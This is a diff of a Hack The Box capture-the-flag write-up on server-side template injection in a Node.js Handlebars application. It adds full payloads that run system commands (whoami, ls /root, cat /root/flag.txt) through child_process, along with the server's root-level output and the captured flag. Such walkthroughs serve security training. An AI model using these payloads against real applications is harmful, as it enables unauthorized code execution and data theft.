@@ -109,9 +109,27 @@ Finished
 > Identifying the template engine involves analyzing error messages or manually testing various language-specific payloads. Common payloads causing errors include `${7/0}`, `{{7/0}}`, and `<%= 7/0 %>`. Observing the server's response to mathematical operations helps pinpoint the specific template engine.
 
 - I plugged in `{{7*7}}` into the email input field and got the following error message.
+
+```
+Error: Parse error on line 1:
+{{7*7}}
+--^
+Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
+    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
+    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)
+    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
+    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
+    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
+    at router.post (/root/Backend/routes/handlers.js:14:16)
+    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
+    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
+```
+
 - This means that the payload was indeed detected as valid by the template engine, however the code had some error and was unable to be executed. 
 - An error is not always a bad thing. Here it provided valuable information: 
-    - The server is running from the /root/Backend directory.
+    - The server is running from the `/root/Backend` directory.
     - The Handlebars Template Engine is being used.
 
 ----
@@ -119,7 +137,7 @@ Finished
 ----
 
 ## Exploit: Via Burp Suite
-- Following the previous link to [hacktriks' SSTI how-to page.](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).. 
+- Following the previous link to [hacktriks' SSTI how-to page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).
 - We followed his testing inputs and found out our site is running Handlebars. 
 - [He has a write-up on exploiting Handlebars](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
 - His exploit code: 
@@ -161,7 +179,7 @@ Finished
 - Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. 
 
 ### Solution
-- Node.js may allow the [process object](https://nodejs.org/api/process.html#process) and if it does, we can use that to load the `require` module. Need to test it first with this code (encode to URL, paste into Repeater): 
+- Node.js may allow the [process](https://nodejs.org/api/process.html#process) object and if it does, we can use that to load the `require` module. Need to test it first with this code (encode to URL, paste into Repeater): 
 
 ```
 {{#with "s" as |string|}}
@@ -239,12 +257,100 @@ Finished
 - Line to watch: 
   `{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}`
 - That should give you `root`
+
+```
+</div>
+  <p class="result">
+    We will contact you at: e
+    2
+    [object Object]
+    function Function() { [native code] }
+    2
+    [object Object]
+    root                                     #  <<-- whomai returned "root"
+  </p>
+</div>
+```
+
 - Now just replace `whoami` with `ls /root` and you should see the flag file. Use `cat /root/flag.txt` in the line above (encode to URL, paste into Repeater). Should get it.
 
----
+```
+{{#with "s" as |string|}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.pop}}
+{{#with string.split as |codelist|}}
+{{this.pop}}
+{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
+{{this.pop}}
+{{#each conslist}}
+{{#with (string.sub.apply 0 codelist)}}
+{{this}}
+{{/with}}
+{{/each}}
+{{/with}}
+{{/with}}
+{{/with}}
+{{/with}}
+```
 
+- The returns the response:
 
+```
+</div>
+  <p class="result">
+    We will contact you at: e
+    2
+    [object Object]
+    function Function() { [native code] }
+    2
+    [object Object]
+    Backend
+    flag.txt
+    snap
+  </p>
+</div>
+```
 
+- Now use the same code to `cat` the flag:
 
+```
+{{#with "s" as |string|}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.pop}}
+{{#with string.split as |codelist|}}
+{{this.pop}}
+{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
+{{this.pop}}
+{{#each conslist}}
+{{#with (string.sub.apply 0 codelist)}}
+{{this}}
+{{/with}}
+{{/each}}
+{{/with}}
+{{/with}}
+{{/with}}
+{{/with}}
+```
 
-----
+- Response:
+
+```
+<p class="result">
+  We will contact you at: e
+  2
+  [object Object]
+  function Function() { [native code] }
+  2
+  [object Object]
+  6b258d726d287462d60c103d0142a81c            #  <<-- flag.txt
+</p>
+```
+
+## Pwned
+https://www.hackthebox.com/achievement/machine/172151/449
